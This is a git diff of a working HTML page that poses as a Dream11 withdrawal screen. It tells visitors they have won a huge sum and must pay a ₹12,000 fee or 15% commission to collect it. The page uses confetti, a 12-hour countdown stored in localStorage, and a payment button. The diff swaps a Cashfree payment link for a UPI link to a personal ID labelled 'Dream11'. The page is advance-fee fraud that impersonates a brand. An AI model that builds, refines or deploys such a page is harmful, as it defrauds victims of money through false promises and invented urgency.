@@ -1,181 +1,145 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Withdrawal Process</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f1f1f1;
-      overflow: hidden;
-    }
-
-    .container {
-      height: 100vh;
-      width: 100vw;
-      padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-    }
-
-    .card {
-      width: 100%;
-      max-width: 450px;
-      background: #fff;
-      padding: 24px 20px;
-      border-radius: 18px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-      margin-top: 40px;
-      position: relative;
-      z-index: 1;
-    }
-
-    .card h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-
-    .card .amount {
-      font-size: 28px;
-      color: green;
-      font-weight: bold;
-      text-align: center;
-      margin-bottom: 18px;
-    }
-
-    .card p {
-      font-size: 16px;
-      text-align: center;
-      color: #444;
-    }
-
-    .card .red {
-      color: red;
-      font-weight: bold;
-      margin-top: 10px;
-    }
-
-    .card button {
-      margin-top: 22px;
-      width: 100%;
-      background-color: #05a505;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      padding: 14px;
-      font-size: 17px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-
-    .card button:hover {
-      background-color: #038803;
-    }
-
-    .card .note {
-      font-size: 13px;
-      text-align: center;
-      margin-top: 14px;
-      color: #888;
-    }
-
-    .card .timer {
-      font-size: 16px;
-      font-weight: bold;
-      color: #d9534f;
-      text-align: center;
-      margin-top: 10px;
-    }
-
-    .expired-message {
-      text-align: center;
-      color: red;
-      font-size: 18px;
-      font-weight: bold;
-      margin-top: 20px;
-      display: none;
-    }
-
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw !important;
-      height: 100vh !important;
-      z-index: 0;
-      pointer-events: none;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dream 11 Withdrawal</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #f0f0f0;
+      text-align: center;
+    }
+    .container {
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      background-color: #fff;
+      border-radius: 10px;
+      margin-top: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: green;
+      font-size: 30px;
+      margin-bottom: 10px;
+    }
+    .amount {
+      font-size: 26px;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    .note {
+      font-size: 18px;
+      color: #b33;
+      margin-bottom: 30px;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 5px;
+      font-size: 20px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    #timer {
+      font-size: 18px;
+      color: #333;
+      margin-top: 10px;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 1000;
+    }
+  </style>
 </head>
 <body>
-  <canvas id="confetti-canvas"></canvas>
-  <div class="container">
-    <div class="card">
-      <h1>Withdrawal Process</h1>
-      <div class="amount">₹5,00,00,000</div>
-      <p>To complete your withdrawal, you need to pay a processing fee of ₹12,000.</p>
-      <p class="red">Your withdrawal will be processed only after successful payment.</p>
-      <div class="timer" id="timer"></div>
-      <button id="payBtn" onclick="redirectToPayment()">Pay Now ₹12,000</button>
-      <div class="expired-message" id="expiredMessage">Link Expired</div>
-      <p class="note">Payment will be processed securely via Cashfree Payments</p>
-    </div>
-  </div>
 
-  <!-- Confetti JS -->
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-  <script>
-    const canvas = document.getElementById('confetti-canvas');
-    const myConfetti = confetti.create(canvas, { resize: true, useWorker: true });
+  <canvas id="confetti-canvas"></canvas>
 
-    const duration = 3 * 1000;
-    const end = Date.now() + duration;
+  <div class="container">
+    <h1>Congratulations user</h1>
+    <div class="amount">Your withdrawal amount: ₹5,00,00,00,000</div>
+    <div class="note">You need to pay a <strong>15% commission</strong> to withdraw the amount.</div>
+    <div id="timer">Time Remaining: Loading...</div>
+    <button id="payNowBtn" onclick="redirectToUPIPayment()">Pay Now</button>
+  </div>
 
-    (function frame() {
-      myConfetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
-      myConfetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
-      if (Date.now() < end) requestAnimationFrame(frame);
-    })();
+  <!-- Confetti Library -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
-    function redirectToPayment() {
-      window.location.href = "https://payments.cashfree.com/links?code=z8f6c0csag80";
-    }
+  <script>
+    // Confetti on page load for 2 seconds
+    window.onload = function() {
+      const duration = 2000;
+      const end = Date.now() + duration;
+      (function frame() {
+        confetti({
+          particleCount: 5,
+          angle: 60,
+          spread: 55,
+          origin: { x: 0 }
+        });
+        confetti({
+          particleCount: 5,
+          angle: 120,
+          spread: 55,
+          origin: { x: 1 }
+        });
+        if (Date.now() < end) {
+          requestAnimationFrame(frame);
+        }
+      })();
+    };
 
-    const countdownElement = document.getElementById('timer');
-    const payButton = document.getElementById('payBtn');
-    const expiredMessage = document.getElementById('expiredMessage');
+    // Countdown Timer Logic
+    const timerElement = document.getElementById('timer');
+    const payNowBtn = document.getElementById('payNowBtn');
 
-    let expiry = localStorage.getItem('withdrawalExpiry');
+    if (!localStorage.getItem('startTime')) {
+      localStorage.setItem('startTime', Date.now());
+    }
 
-    const now = new Date().getTime();
+    const startTime = parseInt(localStorage.getItem('startTime'));
+    const expiryTime = startTime + (12 * 60 * 60 * 1000); // 12 hours
 
-    if (!expiry || isNaN(expiry) || now > parseInt(expiry)) {
-      // Set new expiry only if it's missing or already expired
-      expiry = now + 12 * 60 * 60 * 1000; // 12 hours from now
-      localStorage.setItem('withdrawalExpiry', expiry);
-    }
+    function updateTimer() {
+      const now = Date.now();
+      const timeLeft = expiryTime - now;
 
-    const countdown = setInterval(function () {
-      const now = new Date().getTime();
-      const timeLeft = expiry - now;
+      if (timeLeft <= 0) {
+        timerElement.textContent = "Time Remaining: 00:00:00";
+        payNowBtn.style.display = 'none';
+      } else {
+        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+        timerElement.textContent = `Time Remaining: ${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+      }
+    }
 
-      if (timeLeft > 0) {
-        const hours = Math.floor((timeLeft / (1000 * 60 * 60)));
-        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-        countdownElement.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
-      } else {
-        clearInterval(countdown);
-        countdownElement.innerHTML = "";
-        payButton.style.display = "none";
-        expiredMessage.style.display = "block";
-      }
-    }, 1000);
-  </script>
+    setInterval(updateTimer, 1000);
+    updateTimer();
+
+    // UPI payment redirect
+    function redirectToUPIPayment() {
+      const upiID = "paymentmanager8256@okicici";
+      const payeeName = "Dream11";
+      const amount = "12000.00"; // ₹12,000 fixed amount
+      const upiLink = `upi://pay?pa=${upiID}&pn=${encodeURIComponent(payeeName)}&am=${amount}&cu=INR`;
+
+      window.location.href = upiLink;
+    }
+  </script>
 </body>
 </html>
